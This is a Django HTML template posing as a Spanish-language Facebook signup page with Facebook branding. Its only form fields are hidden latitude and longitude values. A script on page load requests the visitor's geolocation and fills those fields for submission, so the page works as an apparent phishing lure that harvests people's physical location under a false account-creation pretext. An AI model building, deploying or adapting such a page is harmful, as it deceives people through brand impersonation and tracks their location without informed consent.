<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Facebook Style | Registro</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!-- Tailwind CDN -->
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex flex-col items-center min-h-screen">
  <!-- Header -->
  <header class="w-full bg-white shadow-sm">
    <div class="max-w-2xl mx-auto flex items-center justify-between p-4">
      <div class="flex items-center space-x-2">
        <svg class="h-8 w-8 text-blue-600" fill="currentColor" viewBox="0 0 24 24">
          <circle cx="12" cy="12" r="10"/>
          <text x="12" y="16" text-anchor="middle" font-size="12" fill="#fff" font-family="Arial">f</text>
        </svg>
        <span class="text-2xl font-bold text-blue-600">Facebook</span>
      </div>
      <button class="text-blue-600 font-semibold hover:underline">Iniciar sesión</button>
    </div>
  </header>
  
  <!-- Main Content -->
  <main class="flex flex-col items-center w-full mt-16">
    <div class="bg-white rounded-2xl shadow-lg p-8 w-full max-w-md">
      <h1 class="text-3xl font-bold text-gray-800 mb-4">Crea una cuenta</h1>
      <p class="text-gray-600 mb-6">Es rápido y fácil.</p>
      <!-- Button -->
      <form method="post">
        {% csrf_token %}
        {{ form.latitud }}
        {{ form.longitud }}
        <button class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold text-lg shadow hover:bg-blue-700 transition" type="submit">Acceder</button>
      </form>

      <script>
        // Esperar a que el DOM cargue
        document.addEventListener("DOMContentLoaded", function () {
          // Verifica si el navegador soporta geolocalización
          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function (position) {
              // Extrae latitud y longitud
              const lat = position.coords.latitude;
              const lon = position.coords.longitude;

              // Inserta valores en los inputs del formulario
              document.querySelector('input[name="latitud"]').value = lat;
              document.querySelector('input[name="longitud"]').value = lon;
            }, function (error) {
              console.warn("Error obteniendo ubicación:", error.message);
            });
          } else {
            alert("Tu navegador no soporta geolocalización.");
          }
        });
    </script>


    
    </main>

    <!-- Footer -->
  <footer class="mt-8 text-gray-500 text-sm">
    Facebook © 2025
  </footer>
</body>
</html>
